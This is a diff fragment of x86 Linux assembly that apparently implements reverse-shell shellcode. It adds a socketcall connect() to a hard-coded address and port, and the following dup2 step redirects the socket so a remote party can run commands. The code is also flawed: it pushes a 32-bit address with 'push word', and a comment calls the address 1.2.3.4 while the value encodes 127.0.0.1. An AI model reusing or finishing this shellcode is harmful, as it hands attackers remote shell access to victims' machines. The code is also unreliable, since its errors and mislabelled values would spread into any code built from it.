@@ -39,17 +39,23 @@ _start:
 
 	mov edx, eax ; Moving the File Descriptor return value to edx
 
-    ;Connect - Connect to an external device
-    mov al, 0x66 ; For Socketcall
-    mov bl, 0x3  ; For Connect
-    
-    ;need to push values to the stack to satisfy the following:
-    ;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
-    
-    push word ;addr
-    push edx    ; Pushing the FD to the stack
 
 
+
+    	;Connect - Connect to an external device
+    	mov al, 0x66 ; For Socketcall
+    	mov bl, 0x3  ; For Connect
+    
+    	;need to push values to the stack to satisfy the following:
+    	;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
+    
+    	push word 0x0100007f ; Each byte represents 1.2.3.4
+	push word 0x4d01
+	push word 0x2
+	
+	
+	;addrlen
+	mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure dynamically
 
 	push 0x10    ; Push addrlen to the stack, of the structure below. This is 16 bytes
 	push ecx     ; The stack pointer 
@@ -59,7 +65,11 @@ _start:
 		     ; ecx with the current stack pointer to the values previously pushed to the stack. 
 
 	int 0x80     ; Interupt to call the syscall
-
+	
+	
+	
+	
+	
 
 
 	;dup2 - duplicate the file descriptor to redirect the incoming connection 
